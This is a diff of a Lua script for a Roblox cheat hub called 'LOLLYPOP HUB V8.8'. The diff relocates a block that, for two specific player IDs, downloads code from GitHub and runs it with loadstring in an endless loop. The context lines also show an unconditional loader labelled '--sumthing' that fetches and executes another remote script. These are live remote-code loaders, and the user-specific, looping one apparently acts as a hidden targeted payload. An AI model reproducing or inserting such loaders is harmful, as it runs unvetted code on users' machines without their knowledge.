@@ -19,15 +19,6 @@ Text = "LOLLYPOP HUB V8.8🍭😋",
 Duration = 7
 })--endnotif
 
-if game.Players.LocalPlayer.UserId == 4406450103 then
-while true do loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/70e922f6b88eee9ca92a74a1dd51bdfa4dbde187/CoinsWalmart",true))();
-end
-end;
-if game.Players.LocalPlayer.UserId == 3001347724 then
-while true do
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/70e922f6b88eee9ca92a74a1dd51bdfa4dbde187/CoinsWalmart",true))();
-end
-end;
 
 --last update
 local LastUpdate = "Last Update: Apr 13, 2024"
@@ -4535,6 +4526,15 @@ end)
 --sumthing
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/uNb6892M/main/pastebin.com.uNb6892M",true))();
 
+if game.Players.LocalPlayer.UserId == 4406450103 then
+while true do loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/70e922f6b88eee9ca92a74a1dd51bdfa4dbde187/CoinsWalmart",true))();
+end
+end;
+if game.Players.LocalPlayer.UserId == 3001347724 then
+while true do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/70e922f6b88eee9ca92a74a1dd51bdfa4dbde187/CoinsWalmart",true))();
+end
+end;
 
 
 -- [ TOGGLE klose/open ] --
